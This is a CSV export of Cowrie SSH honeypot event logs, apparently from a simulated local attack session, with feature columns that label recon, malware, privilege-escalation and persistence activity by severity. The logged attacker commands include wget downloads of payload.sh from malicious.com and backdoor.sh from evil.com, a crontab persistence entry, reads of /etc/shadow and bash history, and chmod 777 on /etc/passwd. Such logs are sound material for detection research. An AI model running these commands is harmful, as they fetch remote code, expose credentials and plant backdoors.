timestamp,eventid,src_ip,session,username,password,command,message,protocol,recon_activity,malware_activity,privilege_escalation,destructive_behavior,persistence_behavior,command_length,failed_command,severity
2026-05-17T18:46:41.911674Z,cowrie.client.version,127.0.0.1,eccfbde76a0d,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:41.912482Z,cowrie.client.kex,127.0.0.1,eccfbde76a0d,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:51.171380Z,cowrie.login.success,127.0.0.1,eccfbde76a0d,root,useradd attacker,,login attempt [root/useradd attacker] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:51.230072Z,cowrie.client.size,127.0.0.1,eccfbde76a0d,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:51.230512Z,cowrie.client.var,127.0.0.1,eccfbde76a0d,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:51.230819Z,cowrie.client.var,127.0.0.1,eccfbde76a0d,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:46:51.231515Z,cowrie.session.params,127.0.0.1,eccfbde76a0d,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:47:50.831201Z,cowrie.command.input,127.0.0.1,eccfbde76a0d,,,wget http://malicious.com/payload.sh,CMD: wget http://malicious.com/payload.sh,ssh,0,1,0,0,0,36,0,Medium
2026-05-17T18:47:52.316440Z,cowrie.session.file_download,127.0.0.1,eccfbde76a0d,,,,Downloaded URL (http://malicious.com/payload.sh) with SHA-256 0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c to var/lib/cowrie/downloads/0581359a38b015c2ada4cf0f9d3c45ad6d11f5bc1bd9bf6a83e31b1b13976d3c,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:47:52.855396Z,cowrie.session.file_download,127.0.0.1,eccfbde76a0d,,,,Downloaded URL (http://evil.com/backdoor.sh) with SHA-256 dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0 to var/lib/cowrie/downloads/dc4ca971c4c7df50c5aaee10082c75563151e4cabff67b0890156b4ea90379e0,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:47:59.434147Z,cowrie.command.input,127.0.0.1,eccfbde76a0d,,,./payload.shuseradd attacker,CMD: ./payload.shuseradd attacker,ssh,0,1,0,0,1,28,0,High
2026-05-17T18:47:59.435085Z,cowrie.command.failed,127.0.0.1,eccfbde76a0d,,,./payload.shuseradd attacker,Command not found: ./payload.shuseradd attacker,ssh,0,1,0,0,1,28,1,High
2026-05-17T18:47:59.941510Z,cowrie.command.input,127.0.0.1,eccfbde76a0d,,,"echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab","CMD: echo ""* * * * * /tmp/backdoor.sh"" >> /etc/crontab",ssh,0,0,0,0,1,49,0,High
2026-05-17T18:48:06.418218Z,cowrie.command.input,127.0.0.1,eccfbde76a0d,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:48:06.420066Z,cowrie.session.file_download,127.0.0.1,eccfbde76a0d,,,,Saved redir contents with SHA-256 2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a to var/lib/cowrie/downloads/2ac500d84da46186c37cb612bf4589648a248eeb8e310bbaa794f2c03305a97a,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:06.421278Z,cowrie.log.closed,127.0.0.1,eccfbde76a0d,,,,Closing TTY Log: var/lib/cowrie/tty/ef9b8784bfb82d5b74a38d40bf360c721b3e3483d5f5eb6a31b9965af1b19841 after 75.2 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:06.425907Z,cowrie.session.closed,127.0.0.1,eccfbde76a0d,,,,Connection lost after 84.5 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:09.165717Z,cowrie.session.connect,127.0.0.1,99e108dc6452,,,,New connection: 127.0.0.1:42018 (127.0.0.1:2222) [session: 99e108dc6452],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:09.169452Z,cowrie.client.version,127.0.0.1,99e108dc6452,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:09.170386Z,cowrie.client.kex,127.0.0.1,99e108dc6452,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:21.476628Z,cowrie.login.success,127.0.0.1,99e108dc6452,root,weras,,login attempt [root/weras] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:21.525815Z,cowrie.client.size,127.0.0.1,99e108dc6452,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:21.526603Z,cowrie.client.var,127.0.0.1,99e108dc6452,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:21.527289Z,cowrie.client.var,127.0.0.1,99e108dc6452,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:21.528411Z,cowrie.session.params,127.0.0.1,99e108dc6452,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:31.519516Z,cowrie.command.input,127.0.0.1,99e108dc6452,,,sudo su,CMD: sudo su,ssh,0,0,1,0,0,7,0,High
2026-05-17T18:48:31.521996Z,cowrie.command.input,127.0.0.1,99e108dc6452,,,cat /etc/shadow,CMD: cat /etc/shadow,ssh,0,0,1,0,0,15,0,High
2026-05-17T18:48:33.053207Z,cowrie.command.input,127.0.0.1,99e108dc6452,,,chmod 777 /etc/passwd,CMD: chmod 777 /etc/passwd,ssh,0,1,1,0,0,21,0,High
2026-05-17T18:48:39.191354Z,cowrie.command.input,127.0.0.1,99e108dc6452,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:48:39.194346Z,cowrie.log.closed,127.0.0.1,99e108dc6452,,,,Closing TTY Log: var/lib/cowrie/tty/a74d8c8fd0d723b7f62ba4693645c435766b59fbcf5eeeab2276e7c6a1597712 after 17.7 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:39.197141Z,cowrie.session.closed,127.0.0.1,99e108dc6452,,,,Connection lost after 30.0 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:59.952807Z,cowrie.session.connect,127.0.0.1,a58452e1ba39,,,,New connection: 127.0.0.1:50550 (127.0.0.1:2222) [session: a58452e1ba39],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:59.955709Z,cowrie.client.version,127.0.0.1,a58452e1ba39,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:48:59.960318Z,cowrie.client.kex,127.0.0.1,a58452e1ba39,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:49:03.930279Z,cowrie.login.success,127.0.0.1,a58452e1ba39,root,tcvp12,,login attempt [root/tcvp12] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:49:03.974886Z,cowrie.client.size,127.0.0.1,a58452e1ba39,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:49:03.975781Z,cowrie.client.var,127.0.0.1,a58452e1ba39,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:49:03.976495Z,cowrie.client.var,127.0.0.1,a58452e1ba39,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:49:03.977861Z,cowrie.session.params,127.0.0.1,a58452e1ba39,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:49:10.414792Z,cowrie.command.input,127.0.0.1,a58452e1ba39,,,chmod +x payload.sh,CMD: chmod +x payload.sh,ssh,0,1,0,0,0,19,0,Medium
2026-05-17T18:49:11.344477Z,cowrie.command.input,127.0.0.1,a58452e1ba39,,,./payload.sh,CMD: ./payload.sh,ssh,0,1,0,0,0,12,0,Medium
2026-05-17T18:49:11.345498Z,cowrie.command.failed,127.0.0.1,a58452e1ba39,,,./payload.sh ,Command not found: ./payload.sh ,ssh,0,1,0,0,0,13,1,Medium
2026-05-17T18:52:10.426873Z,cowrie.session.closed,127.0.0.1,a58452e1ba39,,,,Connection lost after 190.5 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:52:55.989583Z,cowrie.session.connect,127.0.0.1,640beb65f218,,,,New connection: 127.0.0.1:50990 (127.0.0.1:2222) [session: 640beb65f218],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:52:55.991560Z,cowrie.client.version,127.0.0.1,640beb65f218,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:52:55.996520Z,cowrie.client.kex,127.0.0.1,640beb65f218,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:01.618153Z,cowrie.login.success,127.0.0.1,640beb65f218,root,inmkpol,,login attempt [root/inmkpol] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:01.669710Z,cowrie.client.size,127.0.0.1,640beb65f218,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:01.670834Z,cowrie.client.var,127.0.0.1,640beb65f218,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:01.671427Z,cowrie.client.var,127.0.0.1,640beb65f218,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:01.672451Z,cowrie.session.params,127.0.0.1,640beb65f218,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:09.990027Z,cowrie.command.input,127.0.0.1,640beb65f218,,,root/root,CMD: root/root,ssh,0,0,0,0,0,9,0,Normal
2026-05-17T18:53:09.991082Z,cowrie.command.failed,127.0.0.1,640beb65f218,,,root/root ,Command not found: root/root ,ssh,0,0,0,0,0,10,1,Normal
2026-05-17T18:53:09.992865Z,cowrie.command.input,127.0.0.1,640beb65f218,,,admin/admin,CMD: admin/admin,ssh,0,0,0,0,0,11,0,Normal
2026-05-17T18:53:09.993803Z,cowrie.command.failed,127.0.0.1,640beb65f218,,,admin/admin ,Command not found: admin/admin ,ssh,0,0,0,0,0,12,1,Normal
2026-05-17T18:53:10.976013Z,cowrie.command.input,127.0.0.1,640beb65f218,,,root/toor,CMD: root/toor,ssh,0,0,0,0,0,9,0,Normal
2026-05-17T18:53:10.977173Z,cowrie.command.failed,127.0.0.1,640beb65f218,,,root/toor ,Command not found: root/toor ,ssh,0,0,0,0,0,10,1,Normal
2026-05-17T18:53:21.898858Z,cowrie.command.input,127.0.0.1,640beb65f218,,,whoami,CMD: whoami,ssh,1,0,0,0,0,6,0,Low
2026-05-17T18:53:21.905799Z,cowrie.command.input,127.0.0.1,640beb65f218,,,uname -a,CMD: uname -a,ssh,1,0,0,0,0,8,0,Low
2026-05-17T18:53:21.907802Z,cowrie.command.input,127.0.0.1,640beb65f218,,,hostname,CMD: hostname,ssh,1,0,0,0,0,8,0,Low
2026-05-17T18:53:21.911025Z,cowrie.command.input,127.0.0.1,640beb65f218,,,id,CMD: id,ssh,1,0,0,0,0,2,0,Low
2026-05-17T18:53:21.914970Z,cowrie.command.input,127.0.0.1,640beb65f218,,,pwd,CMD: pwd,ssh,1,0,0,0,0,3,0,Low
2026-05-17T18:53:21.917202Z,cowrie.command.input,127.0.0.1,640beb65f218,,,ls -la,CMD: ls -la,ssh,1,0,0,0,0,6,0,Low
2026-05-17T18:53:21.925840Z,cowrie.command.input,127.0.0.1,640beb65f218,,,cat /etc/passwd,CMD: cat /etc/passwd,ssh,0,0,1,0,0,15,0,High
2026-05-17T18:53:21.928672Z,cowrie.command.input,127.0.0.1,640beb65f218,,,cat /etc/shadow,CMD: cat /etc/shadow,ssh,0,0,1,0,0,15,0,High
2026-05-17T18:53:21.931083Z,cowrie.command.input,127.0.0.1,640beb65f218,,,ps aux,CMD: ps aux,ssh,1,0,0,0,0,6,0,Low
2026-05-17T18:53:21.936566Z,cowrie.command.input,127.0.0.1,640beb65f218,,,netstat -tulnp,CMD: netstat -tulnp,ssh,1,0,0,0,0,14,0,Low
2026-05-17T18:53:21.937960Z,cowrie.command.input,127.0.0.1,640beb65f218,,,history,CMD: history,ssh,0,0,0,0,0,7,0,Normal
2026-05-17T18:53:22.501249Z,cowrie.command.input,127.0.0.1,640beb65f218,,,env,CMD: env,ssh,0,0,0,0,0,3,0,Normal
2026-05-17T18:53:30.718460Z,cowrie.command.input,127.0.0.1,640beb65f218,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:53:30.719848Z,cowrie.log.closed,127.0.0.1,640beb65f218,,,,Closing TTY Log: var/lib/cowrie/tty/9c9df364ec47a251f34086e2bae8cadd725c8f52f989b338937490be2c1d461e after 29.0 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:30.721567Z,cowrie.session.closed,127.0.0.1,640beb65f218,,,,Connection lost after 34.7 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:32.245742Z,cowrie.session.connect,127.0.0.1,116c7a3249b1,,,,New connection: 127.0.0.1:50170 (127.0.0.1:2222) [session: 116c7a3249b1],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:32.248431Z,cowrie.client.version,127.0.0.1,116c7a3249b1,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:32.249770Z,cowrie.client.kex,127.0.0.1,116c7a3249b1,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:41.706937Z,cowrie.login.success,127.0.0.1,116c7a3249b1,root,wesdtgyhuj,,login attempt [root/wesdtgyhuj] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:41.743972Z,cowrie.client.size,127.0.0.1,116c7a3249b1,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:41.744419Z,cowrie.client.var,127.0.0.1,116c7a3249b1,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:41.744774Z,cowrie.client.var,127.0.0.1,116c7a3249b1,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:41.745535Z,cowrie.session.params,127.0.0.1,116c7a3249b1,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:47.430377Z,cowrie.command.input,127.0.0.1,116c7a3249b1,,,sudo su,CMD: sudo su,ssh,0,0,1,0,0,7,0,High
2026-05-17T18:53:47.432057Z,cowrie.command.input,127.0.0.1,116c7a3249b1,,,sudo -l,CMD: sudo -l,ssh,0,0,1,0,0,7,0,High
2026-05-17T18:53:47.438734Z,cowrie.command.input,127.0.0.1,116c7a3249b1,,,find / -perm -4000 2>/dev/null,CMD: find / -perm -4000 2>/dev/null,ssh,0,0,0,0,0,30,0,Normal
2026-05-17T18:53:48.722098Z,cowrie.command.input,127.0.0.1,116c7a3249b1,,,chmod 777 /etc/passwd,CMD: chmod 777 /etc/passwd,ssh,0,1,1,0,0,21,0,High
2026-05-17T18:53:55.804122Z,cowrie.command.input,127.0.0.1,116c7a3249b1,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:53:55.807598Z,cowrie.log.closed,127.0.0.1,116c7a3249b1,,,,Closing TTY Log: var/lib/cowrie/tty/65168bf632943fe657a99a519d90ccf98d8aea6681934ec57c697fc3f167ce38 after 14.1 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:53:55.812687Z,cowrie.session.closed,127.0.0.1,116c7a3249b1,,,,Connection lost after 23.6 seconds,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:10.263162Z,cowrie.session.connect,127.0.0.1,7a4f962adbaa,,,,New connection: 127.0.0.1:36364 (127.0.0.1:2222) [session: 7a4f962adbaa],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:10.268964Z,cowrie.client.version,127.0.0.1,7a4f962adbaa,,,,Remote SSH version: SSH-2.0-OpenSSH_10.2p1 Debian-5,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:10.271768Z,cowrie.client.kex,127.0.0.1,7a4f962adbaa,,,,SSH client hassh fingerprint: eeca2460550b9ded084ecf2f70a75356,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:17.842019Z,cowrie.login.success,127.0.0.1,7a4f962adbaa,root,cat /etc/shadow,,login attempt [root/cat /etc/shadow] succeeded,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:17.879042Z,cowrie.client.size,127.0.0.1,7a4f962adbaa,,,,Terminal Size: 121 39,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:17.880081Z,cowrie.client.var,127.0.0.1,7a4f962adbaa,,,,request_env: COLORTERM=truecolor,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:17.880799Z,cowrie.client.var,127.0.0.1,7a4f962adbaa,,,,request_env: LANG=en_IN,ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:17.882078Z,cowrie.session.params,127.0.0.1,7a4f962adbaa,,,,[],ssh,0,0,0,0,0,0,0,Normal
2026-05-17T18:54:28.654761Z,cowrie.command.input,127.0.0.1,7a4f962adbaa,,,cat /etc/shadow,CMD: cat /etc/shadow,ssh,0,0,1,0,0,15,0,High
2026-05-17T18:54:28.660852Z,cowrie.command.input,127.0.0.1,7a4f962adbaa,,,grep password database.sql,CMD: grep password database.sql,ssh,0,0,0,0,0,26,0,Normal
2026-05-17T18:54:29.775246Z,cowrie.command.input,127.0.0.1,7a4f962adbaa,,,cat ~/.bash_history,CMD: cat ~/.bash_history,ssh,0,0,0,0,0,19,0,Normal
2026-05-17T18:54:42.549378Z,cowrie.command.input,127.0.0.1,7a4f962adbaa,,,exit,CMD: exit,ssh,0,0,0,0,0,4,0,Normal
2026-05-17T18:54:42.552428Z,cowrie.log.closed,127.0.0.1,7a4f962adbaa,,,,Closing TTY Log: var/lib/cowrie/tty/5b6f5e5df1e3b2c397a1075b844906cb09ec7f7b776ace72f0bc583cc1ed91a6 after 24.7 seconds,ssh,0,0,0,0,0,0,0,Normal
